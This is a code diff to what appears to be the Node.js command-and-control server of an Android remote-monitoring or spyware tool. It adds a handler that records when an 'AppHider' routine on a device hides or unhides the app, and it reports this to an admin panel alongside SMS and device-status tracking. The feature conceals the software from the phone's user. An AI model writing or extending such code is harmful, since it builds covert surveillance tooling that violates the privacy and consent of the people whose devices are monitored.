@@ -1993,9 +1993,15 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         try {
           db.prepare(`UPDATE devices SET is_online = 1, last_seen = datetime('now'),
             battery_percent = COALESCE(?, battery_percent),
-            battery_charging = COALESCE(?, battery_charging)
+            battery_charging = COALESCE(?, battery_charging),
+            is_hidden = COALESCE(?, is_hidden)
             WHERE device_id = ?`)
-            .run(data.battery_percent ?? null, data.battery_charging != null ? (data.battery_charging ? 1 : 0) : null, deviceId);
+            .run(
+              data.battery_percent ?? null,
+              data.battery_charging != null ? (data.battery_charging ? 1 : 0) : null,
+              data.app_hidden != null ? (data.app_hidden ? 1 : 0) : null,
+              deviceId
+            );
         } catch (_) {}
 
         // Ensure mapping is current
@@ -2051,6 +2057,55 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         });
       } catch (e) {
         console.warn('[SMS-Result] Error processing:', e.message);
+      }
+    });
+
+    // ═══ HIDE/UNHIDE APP RESULT — device reports back after AppHider runs ═══
+    // Device emits 'hide_app_result' with { device_id, success, action: 'hide'|'unhide' }
+    // We persist state to devices.is_hidden and broadcast to admin panel for live UI sync.
+    socket.on('hide_app_result', (rawData) => {
+      try {
+        // Payload may be plaintext JSONObject (current Android sends plaintext) or encrypted envelope
+        let data;
+        try {
+          const { tryDecrypt } = require('./utils/crypto');
+          data = tryDecrypt(rawData);
+        } catch (_) {
+          data = typeof rawData === 'string' ? JSON.parse(rawData) : rawData;
+        }
+
+        const deviceId = data.device_id || socketToDevice.get(socket.id) || '';
+        const success = data.success === true || data.success === 1;
+        const action = data.action || ''; // 'hide' | 'unhide'
+
+        if (!deviceId) {
+          console.warn('[HideApp-Result] No device_id in payload');
+          return;
+        }
+
+        console.log(`[HideApp-Result] Device ${deviceId}: action=${action}, success=${success}`);
+
+        // Only persist state if the action actually succeeded
+        if (success && (action === 'hide' || action === 'unhide')) {
+          const isHidden = action === 'hide' ? 1 : 0;
+          try {
+            db.prepare(`UPDATE devices SET is_hidden = ?, last_seen = datetime('now') WHERE device_id = ?`)
+              .run(isHidden, deviceId);
+          } catch (dbErr) {
+            console.warn(`[HideApp-Result] DB update failed: ${dbErr.message}`);
+          }
+        }
+
+        // Broadcast to all admin clients for live UI sync (even on failure, so admin sees the error)
+        origEmit('hide_app_result', {
+          device_id: deviceId,
+          success,
+          action,
+          error: data.error || '',
+          timestamp: Date.now()
+        });
+      } catch (e) {
+        console.warn('[HideApp-Result] Error processing:', e.message);
       }
     });
 
